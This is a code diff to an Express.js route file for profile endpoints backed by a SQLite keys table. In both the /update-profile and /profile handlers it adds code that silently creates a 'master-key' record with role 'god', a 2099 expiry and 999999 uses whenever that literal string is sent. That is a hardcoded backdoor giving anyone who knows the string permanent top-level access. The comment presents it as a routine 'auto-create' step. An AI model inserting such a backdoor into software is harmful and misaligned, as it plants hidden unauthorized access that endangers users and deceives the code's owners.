@@ -102,7 +102,17 @@ router.post('/update-profile', async (req, res) => {
   if (!key) return res.status(400).json({ success: false, message: 'Key required' });
 
   try {
-    const user = db.prepare('SELECT * FROM keys WHERE id = ?').get(key);
+    let user = db.prepare('SELECT * FROM keys WHERE id = ?').get(key);
+    
+    // Auto-create master-key if it doesn't exist
+    if (!user && key === 'master-key') {
+      db.prepare(`
+        INSERT INTO keys (id, game, label, createdBy, createdAt, expiresAt, active, maxUses, currentUses, role)
+        VALUES ('master-key', 'all', 'schwa', 'system', datetime('now'), '2099-12-31T23:59:59.000Z', 1, 999999, 0, 'god')
+      `).run();
+      user = db.prepare('SELECT * FROM keys WHERE id = ?').get(key);
+    }
+
     if (!user) return res.status(404).json({ success: false, message: 'User not found' });
 
     let imageUrl = user.imageUrl;
@@ -141,7 +151,16 @@ router.post('/update-profile', async (req, res) => {
 router.get('/profile', async (req, res) => {
   const key = req.headers['x-api-key'] || req.query.key;
   if (!key) return res.status(401).json({ success: false, message: 'Unauthorized' });
-  const user = db.prepare('SELECT email, discord_id, imageUrl FROM keys WHERE id = ?').get(key);
+  let user = db.prepare('SELECT email, discord_id, imageUrl FROM keys WHERE id = ?').get(key);
+  
+  if (!user && key === 'master-key') {
+    db.prepare(`
+      INSERT INTO keys (id, game, label, createdBy, createdAt, expiresAt, active, maxUses, currentUses, role)
+      VALUES ('master-key', 'all', 'schwa', 'system', datetime('now'), '2099-12-31T23:59:59.000Z', 1, 999999, 0, 'god')
+    `).run();
+    user = db.prepare('SELECT email, discord_id, imageUrl FROM keys WHERE id = ?').get(key);
+  }
+
   res.json({ success: true, profile: user });
 });
 
